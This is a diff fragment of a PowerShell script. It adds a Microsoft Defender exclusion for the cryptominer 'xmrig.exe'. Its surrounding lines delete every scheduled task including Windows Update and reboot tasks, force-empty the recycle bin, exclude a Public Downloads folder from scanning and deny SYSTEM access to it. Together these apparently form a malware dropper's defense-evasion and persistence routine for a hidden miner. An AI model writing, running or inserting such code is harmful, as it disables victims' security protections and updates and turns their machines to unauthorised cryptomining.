@@ -248,6 +248,7 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -like "\Microsoft\Windows\WindowsU
 Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -like "*restart*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
 Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
 Clear-RecycleBin -Force
+Add-MpPreference -ExclusionProcess "xmrig.exe"
 Add-MpPreference -ExclusionProcess ((Get-CimInstance Win32_Process -Filter "Name='xmrig.exe'").ExecutablePath)
 Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
 icacls "C:\Users\Public\Downloads" /deny "*S-1-5-18:(OI)(CI)(F)"
